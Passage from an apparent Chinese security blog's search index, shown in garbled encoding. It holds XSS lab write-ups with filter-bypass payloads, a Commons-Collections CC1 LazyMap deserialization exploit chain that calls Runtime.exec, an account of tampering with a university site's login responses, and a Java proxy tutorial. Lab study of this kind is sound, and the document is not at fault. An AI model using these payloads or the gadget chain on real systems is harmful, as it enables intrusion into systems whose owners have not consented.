ä½†æ˜¯ä¸èƒ½åŒ…æ¶µé‚£äº›ç›´æ¥å¼¹çª—çš„ä¸œè¥¿å¦‚\u003cscript\u003eï¼Œå¯ä»¥åŒ…å«æ‰‹åŠ¨å¼¹çª—ï¼Œæ¯”å¦‚\u003ca\u003eã€\u003cinput\u003eã€\u003cimg\u003eã€\u003cp\u003eæ ‡ç­¾ç­‰ç­‰ï¼Œé‚£ä¹ˆæ„é€  ?src='/level1.php?name=\u003cimg src=1 onmouseover=alert()\u003e'![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/å±å¹•æˆªå›¾ 2024-01-10 153113.png) ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:15:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-16 ç›´æ¥çœ‹æºç  é¦–å…ˆ script æ ‡ç­¾è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæ¢å…¶ä»–çš„æ ‡ç­¾ï¼ˆç”¨ä¸éœ€è¦ç”¨ / ç¬¦å·çš„æ ‡ç­¾ï¼‰ï¼Œè‡³äºç©ºæ ¼ç”¨%0aä»£æ›¿ \u003cimg%0asrc=\"x\"%0aonerror=alert(\"xss\");\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:16:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-17 ç›´æ¥çœ‹æºä»£ç  ç®€å•è§£é‡Šå°±æ˜¯åŒ…å«æ­£ç¡®çš„åŒºåŸŸå°±è¡Œäº†ï¼ŒæŠŠæºç æ”¹ä¸ºåŒ…å«level15.pngï¼ˆswfæ–‡ä»¶è¦ä¸‹è½½ flash player æ’ä»¶æ‰è¡Œï¼‰å°±èƒ½æ­£å¸¸åŒ…å«åŒºåŸŸï¼Œç„¶åä¼ å…¥ ?arg01= onmouseover\u0026arg02=alert() ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:17:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-18 çœ‹æºç å’Œ17å…³å·®ä¸å¤šï¼Œæ”¹äº†åŒ…å«æ–‡ä»¶ç›´æ¥ä¼ 17å…³çš„payload ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:18:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-19 æ¶‰åŠåˆ°äº† swf çš„åç¼–è¯‘ï¼Œä¸‹è½½ä¸ªflash playerçœ‹çœ‹ï¼ˆä¸çŸ¥é“ä¸ºå•¥é‡å¤äº†å‡ éï¼‰ã€‚æ ¹æ®å¸ˆå‚…è§£é‡Šè¿™é‡Œflashé‡Œé¢æç¤ºsifr.jsæ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œæ‰€ä»¥éœ€è¦åç¼–è¯‘çœ‹çœ‹æºç ã€‚ å·¥å…· jpexs ä¸‹è½½åï¼Œè·Ÿç€å¸ˆå‚…åš å‘ç°flashæ˜¾ç¤ºçš„å†…å®¹ å‘ç°%sæ˜¯æ˜¾ç¤ºå†…å®¹çš„ä¸€ä¸ªå˜é‡ï¼Œæº¯æº%sï¼Œ è¯»ä¸æ‡‚ï¼Œçœ‹å¸ˆå‚…wpå¤§æ¦‚æ˜¯å’Œversionæœ‰å…³ï¼Œ çœ‹ä¸æ‡‚ä¸€ç‚¹ğŸ˜“ğŸ˜“ğŸ˜“ï¼Œä¸ç®¡é‚£ä¹ˆå¤šäº†ï¼Œè·Ÿç€ä¼ å…¥payloadï¼Œé‚£ä¸ªversionå°±æ˜¯åç¼–è¯‘çœ‹å‡ºæ¥çš„ï¼Œå¤§æ¦‚æ˜¯version=123ï¼Œç„¶åfindé‡Œ%så°±æ˜¾ç¤ºçš„123 ç»§ç»­ arg01=version\u0026arg02=\u003ca href=\"javascript:alert(/xss/)\"\u003exss\u003c/a\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:19:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["æ¼æ´å­¦ä¹ "],"content":"level-20 ä¹Ÿè¦åç¼–è¯‘ï¼Œçœ‹çœ‹wpå¾—äº† å‚è€ƒï¼šhttps://blog.csdn.net/u014029795/article/details/103217680 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:20:0","tags":["xss"],"title":"XSSé¶åœºè®­ç»ƒ","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["src"],"content":"è®°ä¸€æ¬¡ edu è¯ä¹¦ç«™å¤±è´¥çš„é€»è¾‘æ¼æ´ é—²æ¥æ— äº‹ï¼Œåœ¨ç¤¼ç‰©ä¸­å¿ƒçœ‹åˆ°ä¸ªè¯ä¹¦ç«™ï¼Œçœ‹åç§°æ„Ÿè§‰åº”è¯¥æŒºå¥½æŒ–çš„ï¼Œç®€å•ä¿¡æ¯æœé›†ä¸€æ³¢ï¼Œåœ¨ hunter ä¸ŠæŸ¥çœ‹å­åŸŸåï¼Œå‘ç°æœ‰ä¸ªç®¡ç†ç³»ç»Ÿ è®¿é—®è¯¥é“¾æ¥ï¼Œæ˜¯ä¸ªç™»å½•æ¡† ç°åœ¨éœ€è¦å»æä¸€æ‰‹å­¦å·ä»€ä¹ˆçš„äº†ï¼ˆå› ä¸ºæ˜¯éšä¾¿çœ‹çœ‹çš„æ‰€ä»¥æ²¡æœ‰å…ˆä¿¡æ¯æœé›†ï¼‰ï¼Œåˆ©ç”¨ hack è¯­æ³•æ‰¾äº†åŠå¤©åªæ‰¾åˆ° 16ï¼Œ17 çº§çš„å­¦ç”Ÿå­¦å·ï¼Œå°è¯•åˆ©ç”¨æ˜¾ç¤ºè´¦å·é”™è¯¯ï¼Œçœ‹æ¥è¿˜æ˜¯éœ€è¦æ‰¾è¿‘å‡ å¹´çš„äº†ï¼Œ åˆå» dyï¼Œxhs ç­‰ç¤¾äº¤å¹³å°ä¸Šæ‰¾äº†åŠå¤©å‘ç°æ²¡æœ‰ç«Ÿç„¶æ²¡æ‰¾åˆ°ï¼Œæœ€åç›´æ¥é€šè¿‡ 16ï¼Œ17 çš„å­¦å·é‡æ–°æ„é€ çˆ†ç ´çš„ 24 çº§å­¦å·ï¼Œå°è¯•å¼±å¯†ç ç™»å½•å‘ç°æ²¡æˆï¼Œç›´æ¥è¯•è¯•æŠ“åŒ…æ”¹å›åŒ… æŠŠå›åŒ…çš„ 402 æ”¹ä¸º 200 æç¤º è¯´æ˜åº”è¯¥æ˜¯æˆåŠŸç™»å½•è¿›å»äº†ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦å¯¹ç”¨æˆ·è¿›è¡Œé‰´æƒæ‰ä¼šæ˜¾ç¤ºåŠŸèƒ½ç‚¹ï¼Œé‚£ä¹ˆæ—¢ç„¶ç™»å½•å­˜åœ¨é€»è¾‘æ¼æ´ï¼Œæ˜¯å¦ä¿®æ”¹å¯†ç ä¹Ÿå­˜åœ¨ç›¸åŒçš„æ¼æ´ï¼Œ åŒç†æŠ“åŒ…ä¿®æ”¹ å‘ç°ç›´æ¥æ¥åˆ°äº†è®¾ç½®æ–°å¯†ç ï¼Œè¯´æ˜é€»è¾‘æ¼æ´ç»•è¿‡æˆåŠŸäº†ï¼Œ æœ€åä¿®æ”¹å¯†ç æˆåŠŸï¼Œ å†æ¬¡è¿›è¡Œç™»å½•ï¼Œå‘ç°è¿˜æ˜¯æç¤ºè´¦å·æˆ–å¯†ç æœ‰è¯¯ï¼Œ çŒœæµ‹è¯¥é€»è¾‘æ¼æ´å¯èƒ½åªæ˜¯å‰ç«¯é€»è¾‘æ¼æ´ï¼Œé€šè¿‡ä¿®æ”¹çš„å“åº”å€¼åªèƒ½å†³å®šå‰ç«¯çš„æ˜¾ç¤ºã€‚æ•°æ®å¹¶æ²¡æœ‰å†™å…¥åç«¯ã€‚ ","date":"2024-10-20","objectID":"/posts/edusrc/:0:0","tags":["src"],"title":"è®°ä¸€æ¬¡ edu è¯ä¹¦ç«™å¤±è´¥çš„é€»è¾‘æ¼æ´","uri":"/posts/edusrc/"},{"categories":["javasec"],"content":"åˆ†æäº†ä¸Šä¸€æ¡é“¾å­ï¼Œå…¶å®åœ¨TransformMapç±»é‚£é‡Œæœ‰ä¸ªåˆ†å‰ç‚¹ï¼Œå°±æ˜¯è¿˜å¯ä»¥åˆ©ç”¨å¦ä¸€ä¸ªç±»LazyMapè¿›è¡Œtransformæ–¹æ³•çš„è°ƒç”¨ã€‚ è¿›å…¥åˆ°LazyMapç±»ä¸­ï¼Œå‘ç°getæ–¹æ³•ä¹Ÿè°ƒç”¨äº†transformæ–¹æ³•ï¼š å¯ä»¥çœ‹åˆ°åœ¨è°ƒç”¨æ–¹æ³•ä¹‹å‰æœ‰ä¸ªifçš„åˆ¤æ–­ï¼Œè·Ÿè¿›è¿™ä¸ªcontainKeyå‡½æ•°ï¼š ç¿»è¯‘ä¸€æ‰‹ï¼š ä¹Ÿå°±æ˜¯ä¼ å…¥çš„keyå€¼æ˜¯mapé”®å€¼å¯¹ä¸­æ²¡æœ‰çš„å°±ä¼šè¿”å›falseäº†ï¼Œè¿™ä¸ªå¾ˆå®¹æ˜“å°±èƒ½å®ç°ã€‚ ç„¶åçœ‹çœ‹æ€ä¹ˆæ§åˆ¶å‚æ•°factoryï¼Œå‘ç°æ„é€ æ–¹æ³•å¯ä»¥å¯¹factoryè¿›è¡Œèµ‹å€¼ï¼Œè™½ç„¶æœ‰ä¸¤ä¸ªæ„é€ æ–¹æ³•ä½†å…¶å‚æ•°ç±»å‹ä¸åŒå…ˆä¸ç®¡ã€‚ è¿™é‡Œåˆæ˜¯ä¿æŠ¤å±æ€§ï¼Œéœ€è¦æ‰¾ä¸€æ‰¾çœ‹æœ‰æ²¡æœ‰å…¶ä»–åœ°æ–¹å¯¹å…¶è¿›è¡Œäº†è°ƒç”¨ã€‚å‘ç°å’ŒTransformMapä¸€æ ·éƒ½æœ‰ä¸ªé™æ€æ–¹æ³•decorateèƒ½å¤Ÿå®ç°æ„é€ æ–¹æ³•çš„è°ƒç”¨ã€‚ æµ‹è¯•ä¸€ä¸‹ï¼š import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; public class CC1test { public static void main(String[] args) throws Exception { InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,t); Lazy.get(Runtime.getRuntime()); } } è¿˜æ˜¯å’Œä¸Šä¸€æ¡é“¾å­ä¸€æ ·ï¼Œç»§ç»­å‘ä¸Šæ‰¾çœ‹è°è°ƒç”¨äº†getæ–¹æ³•ï¼Œå‘ç°æœ‰ä¸€åƒå¤šä¸ªç»“æœï¼Œè¿™æ€ä¹ˆæ‰¾ã€‚ åæ­£æ„Ÿè§‰åº”è¯¥å’Œä¸Šä¸€æ¡é“¾å­æ˜¯å·®ä¸å¤šçš„ï¼Œç›´æ¥ä»ç»ˆç‚¹ç±»AnnotationInvocationHandleå¼€å§‹æ‰¾ï¼Œä¸è¿‡å‘ç°memberValues.getå¹¶ä¸åœ¨readObjetcä¸­è€Œæ˜¯åœ¨invokeæ–¹æ³•é‡Œã€‚ ä½†è¿™é‡Œæ˜¯Handlerä¸­çš„invokeæ–¹æ³•ï¼Œè¿™ä¸æ˜¯å¾ˆç†Ÿæ‚‰å—ã€‚åœ¨jdkåŠ¨æ€ä»£ç†æ˜¯å¯ä»¥é€šè¿‡Proxy.newProxyInstanceè·å¾—å¯¹è±¡ï¼Œç„¶åè°ƒç”¨è¯¥å¯¹è±¡æ–¹æ³•æ¥è¾¾åˆ°Handler.invoke()æ–¹æ³•ã€‚ä½†æ˜¯è¿™æ€ä¹ˆå’ŒreadObjectç›¸è”ç³»å‘¢ï¼Ÿ æˆ‘ä»¬åœ¨æ¥çœ‹çœ‹åœ¨æ‰§è¡ŒreadObjectçš„æ—¶å€™æœ‰æ²¡æœ‰ä»€ä¹ˆæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ–¹æ³•è°ƒç”¨ï¼ˆå› ä¸ºè¦é€šè¿‡æ–¹æ³•è°ƒç”¨æ¥è½¬åˆ°Handler.invoke()æ–¹æ³•ï¼‰ï¼Œ è¿™ä¸ªé¦–å½“å…¶å†²å°±åº”è¯¥æƒ³åˆ°memberValueså§ï¼Œæ¯•ç«Ÿè¿™ä¸ªæ‰¿å‚æ•°æœ€å®¹æ˜“æ§åˆ¶ã€‚ç„¶åçœ‹åˆ°åœ¨forå¾ªç¯çš„æ—¶å€™è°ƒç”¨äº†å…¶æ–¹æ³•entrySetï¼ˆä¸‹é¢å®ƒçš„å…¶ä»–æ–¹æ³•å°±ä¸ç”¨çœ‹äº†ï¼Œè°ƒç”¨åˆ°ç¬¬ä¸€ä¸ªæ–¹æ³•çš„æ—¶å€™å°±å·²ç»è½¬åˆ°Handler.invoke()æ–¹æ³•äº†ï¼‰ã€‚æ‰€ä»¥æ€è·¯æ¸…æ™°äº†ï¼Œå°±æ˜¯è®©memberValuesä¸ºProxy.newProxyInstanceè·å¾—çš„å¯¹è±¡å°±è¡Œäº†ã€‚è¿™æ ·åœ¨è¿›è¡Œååºåˆ—åŒ–çš„åˆ°foræ—¶å°±èƒ½è‡ªåŠ¨è¿›å…¥invokeæ–¹æ³•ï¼Œåœ¨è¿›å…¥invokeæ–¹æ³•æ—¶ï¼Œæˆ‘ä»¬åœ¨é€šè¿‡æ„é€ å‡½æ•°æŠŠmemberValuesè®¾ä¸ºlazyMapï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨åˆ°lazyMapçš„getæ–¹æ³•ï¼Œåœ¨ç”±getæ–¹æ³•å»è°ƒç”¨transformæ–¹æ³•ã€‚ ååºåˆ—åŒ–æ˜¯è¿™æ ·ï¼Œæ‰€ä»¥æ„é€ åºåˆ—åŒ–payloadå°±è¡Œå…ˆæŠŠmemberValuesè®¾ä¸ºlazyMapï¼Œåœ¨æŠŠmemberValuesè®¾ä¸ºProxy.newProxyInstanceè·å¾—çš„å¯¹è±¡ã€‚ å…ˆæ„é€ Hanlderå¯¹è±¡ï¼š Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); //é€šè¿‡æ„é€ å‡½æ•°è®¾memberValuesä¸ºlazyMapç„¶ååˆ©ç”¨Proxy.newProxyInstanceè·å¾—çš„proxyMapå¯¹è±¡å¹¶ä¸”handlerå‚æ•°ä¸ºhandï¼ˆè¿™æ ·å°±å¯è½¬åˆ°AnnotationInvocationHandlerçš„invokeæ–¹æ³•å‘¢ï¼‰ Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},hand);æ¥ä¸‹æ¥åªéœ€è¦è°ƒç”¨proxyMapçš„æ–¹æ³•äº†ï¼Œè®¾memberValuesä¸ºproxyMapï¼š InvocationHandler in =(InvocationHandler) con.newInstance(Repeatable.class,proxyMap);æ‰€ä»¥æœ€åpocï¼š package org.example; import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Repeatable; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Proxy; public class CC1test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}), }; ChainedTransformer cha=new ChainedTransformer(transformers); InvokerTransformer t = new InvokerTransformer(\"exec\", new Class[]{String.class}, new String[]{\"calc\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"entrySe\",\"entrySet\"); //å¯ä»¥ä¸ç”¨è®¾ï¼Œä¸è¦æŠŠkeyè®¾ä¸ºentrySetï¼Œä¸ç„¶ä¸æ»¡è¶³lazy.getæ¡ä»¶ Map\u003cObject,Object\u003e Lazy = LazyMap.decorate(map,cha); Class c=Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor con=c.getDeclaredConstructor(Class.class, Map.class); con.setAccessible(true); InvocationHandler hand=(InvocationHandler)con.newInstance(Override.class,Lazy); Map proxyMap = (Map) Proxy.newProxyInstan","date":"2024-06-22","objectID":"/posts/cc1%E8%A1%A5%E5%85%85-lazymap%E5%88%A9%E7%94%A8/:0:0","tags":["java","ååºåˆ—åŒ–"],"title":"CC1è¡¥å……-LazyMapåˆ©ç”¨","uri":"/posts/cc1%E8%A1%A5%E5%85%85-lazymap%E5%88%A9%E7%94%A8/"},{"categories":["javasec"],"content":"ä»£ç†æ¨¡å¼æ˜¯ä»€ä¹ˆ ä¸€ã€æ¦‚å¿µ åœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå®¢æˆ·ä¸èƒ½æˆ–è€…ä¸æƒ³ç›´æ¥è®¿é—®å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ—¶éœ€è¦æ‰¾ä¸€ä¸ªä¸­ä»‹å¸®å¿™å®ŒæˆæŸé¡¹ä»»åŠ¡ï¼Œè¿™ä¸ªä¸­ä»‹å°±æ˜¯ä»£ç†å¯¹è±¡ã€‚ ä¾‹å¦‚ï¼šè´­ä¹°ç«è½¦ç¥¨ä¸ä¸€å®šè¦å»ç«è½¦ç«™ä¹°ï¼Œå¯ä»¥é€šè¿‡ 12306 ç½‘ç«™æˆ–è€…å»ç«è½¦ç¥¨ä»£å”®ç‚¹ä¹°ã€‚åˆå¦‚æ‰¾å¥³æœ‹å‹ã€æ‰¾ä¿å§†ã€æ‰¾å·¥ä½œç­‰éƒ½å¯ä»¥é€šè¿‡æ‰¾ä¸­ä»‹å®Œæˆã€‚å¹³æ—¶çš„äº¤ä½œä¸šä¹Ÿæ˜¯é€šè¿‡ä¸­ä»‹ï¼ˆè¯¾ä»£è¡¨ï¼‰æ¥å®Œæˆçš„ã€‚ äºŒã€å®šä¹‰ ç”±äºæŸäº›åŸå› éœ€è¦ç»™æŸå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†ä»¥æ§åˆ¶å¯¹è¯¥å¯¹è±¡çš„è®¿é—®ã€‚ è®¿é—®å¯¹è±¡ä¸é€‚åˆæˆ–è€…ä¸èƒ½ç›´æ¥å¼•ç”¨ç›®æ ‡å¯¹è±¡ï¼Œä»£ç†å¯¹è±¡å°±å¯ä»¥ä½œä¸ºè®¿é—®å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡ä¹‹é—´çš„ä¸­ä»‹ã€‚ ä¸‰ã€ä»£ç†æ¨¡å¼ä¸­æ¶‰åŠçš„ä¸»è¦æˆå‘˜ æŠ½è±¡è§’è‰²ï¼šé€šè¿‡æ¥å£æˆ–æŠ½è±¡ç±»å£°æ˜çœŸå®ä¸»é¢˜å’Œä»£ç†å¯¹è±¡å®ç°çš„ä¸šåŠ¡æ–¹æ³•ã€‚ çœŸå®è§’è‰²ï¼šå®ç°äº†æŠ½è±¡ä¸»é¢˜ä¸­çš„å…·ä½“ä¸šåŠ¡ï¼Œæ˜¯ä»£ç†å¯¹è±¡æ‰€ä»£è¡¨çš„çœŸå®å¯¹è±¡ï¼Œæ˜¯æœ€ç»ˆè¦å¼•ç”¨çš„å¯¹è±¡ã€‚ ä»£ç†ï¼šæä¾›äº†ä¸çœŸå®ä¸»é¢˜ç›¸åŒçš„æ¥å£ï¼Œå…¶å†…éƒ¨å«æœ‰å¯¹çœŸå®ä¸»é¢˜çš„å¼•ç”¨ï¼Œå®ƒå¯ä»¥è®¿é—®ã€æ§åˆ¶æˆ–æ‰©å±•çœŸå®ä¸»é¢˜çš„åŠŸèƒ½ã€‚ å®¢æˆ· : å°†è¦ä½¿ç”¨ä»£ç†è§’è‰²æ¥è¿›è¡Œä¸€äº›æ“ä½œ ã€‚ å››ã€ä¼˜ç‚¹ï¼ˆéƒ½æ˜¯äº›å®¢å¥—è¯ï¼‰ ä»£ç†æ¨¡å¼åœ¨å®¢æˆ·ç«¯ä¸ç›®æ ‡å¯¹è±¡ä¹‹é—´èµ·åˆ°ä¸€ä¸ªä¸­ä»‹ä½œç”¨å’Œä¿æŠ¤ç›®æ ‡å¯¹è±¡çš„ä½œç”¨ ä»£ç†å¯¹è±¡å¯ä»¥æ‰©å±•ç›®æ ‡å¯¹è±¡çš„åŠŸèƒ½ ä»£ç†æ¨¡å¼èƒ½å°†å®¢æˆ·ç«¯ä¸ç›®æ ‡å¯¹è±¡åˆ†ç¦»ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé™ä½äº†ç³»ç»Ÿçš„è€¦åˆåº¦ï¼Œå¢åŠ äº†ç¨‹åºçš„å¯æ‰©å±•æ€§ äº”ã€ç¼ºç‚¹ å†—ä½™ï¼Œç”±äºä»£ç†å¯¹è±¡è¦å®ç°ä¸ç›®æ ‡å¯¹è±¡ä¸€è‡´çš„æ¥å£ï¼Œä¼šäº§ç”Ÿè¿‡å¤šçš„ä»£ç†ç±» ç³»ç»Ÿè®¾è®¡ä¸­ç±»çš„æ•°é‡å¢åŠ ï¼Œå˜å¾—éš¾ä»¥ç»´æŠ¤ ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:1:0","tags":["java"],"title":"javaåŠ¨æ€ä»£ç†","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"é™æ€ä»£ç† éœ€è¦ä»£ç†å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡å®ç°ä¸€è‡´çš„æ¥å£ã€‚ ä¾‹å¦‚ï¼šå­¦ç”Ÿäº¤ä½œä¸šï¼Œä¸€èˆ¬éƒ½æ˜¯å­¦ç”Ÿå…ˆäº¤ç»™è¯¾ä»£è¡¨ï¼Œè¯¾ä»£è¡¨äº¤ç»™è€å¸ˆè¿™ç§æ¨¡å¼ã€‚è¯¾ä»£è¡¨åœ¨è¿™é‡Œç›¸å½“äºè¯´ä¸€ä¸ªå­¦ç”Ÿä»£ç†ç±»ã€‚ homework.javaï¼ˆæŠ½è±¡è§’è‰²ï¼šäº¤ä½œä¸šï¼‰ //æŠ½è±¡è§’è‰²ï¼šäº¤ä½œä¸š public interface homework { public void hwsent(); }student.javaï¼ˆçœŸå®è§’è‰²ï¼šå­¦ç”Ÿï¼‰ //çœŸå®è§’è‰²ï¼šå­¦ç”Ÿï¼Œäº¤ä½œä¸š public class student implements homework { public void hwsent() { System.out.println(\"å¼ ä¸‰äº¤ä½œä¸š\"); } }Proxy.javaï¼ˆä»£ç†ï¼šè¯¾ä»£è¡¨ï¼‰ //ä»£ç†ï¼šè¯¾ä»£è¡¨ public class Proxy implements homework{ student Student; public Proxy(student stu){ //ä»£ç†ç±»çš„æ„é€ å‡½æ•°ï¼Œå‚æ•°æ˜¯å¾…ä¼šä¼ å…¥çš„å­¦ç”Ÿç±»çš„å®åˆ—åŒ– this.Student = (student) stu; } public void Helpsubmit(){ //æ·»åŠ çš„åŠŸèƒ½ System.out.println(\"è¯¾ä»£è¡¨å¸®å¿™äº¤ä½œä¸š\"); } public void hwsent() { //æ¥å£æ–¹æ³•çš„é‡å†™ Helpsubmit(); this.Student.hwsent();//è°ƒç”¨å­¦ç”Ÿç±»çš„æ–¹æ³•hwsent() } }Main.javaï¼ˆå®¢æˆ·ï¼šè€å¸ˆï¼Œæ”¶å­¦ç”Ÿä½œä¸šï¼‰ public class Main{ public static void main(String[] args){ System.out.println(\"è€å¸ˆæ”¶ä½œä¸š\"); student stu=new student(); Proxy kdb=new Proxy(stu); kdb.hwsent(); //é€šè¿‡è°ƒç”¨è¯¾ä»£è¡¨çš„hwsent()ï¼Œè€Œè¯¾ä»£è¡¨çš„hwsent()æ–¹æ³•åˆè°ƒç”¨äº†å­¦ç”Ÿçš„hwsent()æ–¹æ³•æ¥å®ç°è°ƒç”¨å­¦ç”Ÿçš„hwsent() } } åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œè€å¸ˆæ¥è§¦çš„æ˜¯è¯¾ä»£è¡¨ï¼Œæ²¡æœ‰æ¥è§¦åˆ°å…·ä½“å­¦ç”Ÿï¼Œä½†æ˜¯ä¾æ—§èƒ½å¤Ÿæ”¶åˆ°ä½œä¸šã€‚ **ç¼ºç‚¹ï¼š**ä¸€æ—¦å®ç°çš„åŠŸèƒ½å¢åŠ ï¼Œå°†ä¼šå˜å¾—å¼‚å¸¸å†—ä½™å’Œå¤æ‚ï¼Œè€Œä¸”å½“éœ€è¦çš„ä»£ç†çš„å¯¹è±¡è¿‡å¤šå°±éœ€è¦å®ç°å¤§é‡çš„ä»£ç†ç±»ã€‚ æ‰€ä»¥åˆæœ‰äº†åŠ¨æ€ä»£ç†ã€‚ ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:2:0","tags":["java"],"title":"javaåŠ¨æ€ä»£ç†","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"åŠ¨æ€ä»£ç† ä¸é™æ€ä»£ç†ç›¸åŒï¼Œéœ€è¦å…¬å…±æ¥å£ï¼ˆæŠ½è±¡è§’è‰²ï¼‰ï¼Œå§”æ‰˜ç±»ï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢çš„å­¦ç”Ÿï¼ŒçœŸå®è§’è‰²ï¼‰ï¼Œä»£ç†ç±»ã€‚åŒºåˆ«å°±æ˜¯åŠ¨æ€ä»£ç†æ˜¯åˆ©ç”¨åå°„æœºåˆ¶åœ¨è¿è¡Œæ—¶åˆ›å»ºä»£ç†ç±»ï¼Œè¿™æ ·å¯ä»¥è§£å†³é™æ€ä»£ç†ä»£ç å†—ä½™ï¼Œéš¾ä»¥ç»´æŠ¤çš„ç¼ºç‚¹ã€‚ åœ¨Javaä¸­å¸¸ç”¨çš„åŠ¨æ€ä»£ç†æœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼ï¼š JDK åŸç”ŸåŠ¨æ€ä»£ç† cglib åŠ¨æ€ä»£ç† javasist åŠ¨æ€ä»£ç† ","date":"2024-06-21","objectID":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/:3:0","tags":["java"],"title":"javaåŠ¨æ€ä»£ç†","uri":"/posts/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"},{"categories":["javasec"],"content":"JDK åŸç”ŸåŠ¨æ€ä»£ç† é¦–å…ˆå®ç°ä¸€ä¸ªInvocationHandlerï¼Œæ–¹æ³•è°ƒç”¨ä¼šè¢«è½¬å‘åˆ°è¯¥ç±»çš„invoke()æ–¹æ³•ã€‚å…·ä½“çœ‹ä¸‹é¢newProxyInstanceæ–¹æ³•çš„ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ ç„¶ååœ¨éœ€è¦ä½¿ç”¨studentçš„æ—¶å€™ï¼Œé€šè¿‡JDKåŠ¨æ€ä»£ç†è·å–studentçš„ä»£ç†å¯¹è±¡ã€‚(ä¸‹é¢çš„ä»£ç†ç±»å°±æ˜¯ä¸Šé¢æ‰€è¯´çš„å§”æ‰˜ç±») ä¸€ã€InvocationHandler.invokeæ–¹æ³• è´Ÿè´£æä¾›è°ƒç”¨ä»£ç†çš„æ“ä½œ: public interface InvocationHandler { public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; }å…¶ä¸­proxyä¸ºä»£ç†ç±»çš„å®ä¾‹å¯¹è±¡ï¼Œmethodè¡¨ç¤ºè°ƒç”¨çš„æ–¹æ³•åï¼Œargsä¸ºè°ƒç”¨æ–¹æ³•çš„å‚æ•°æ•°ç»„ã€‚ 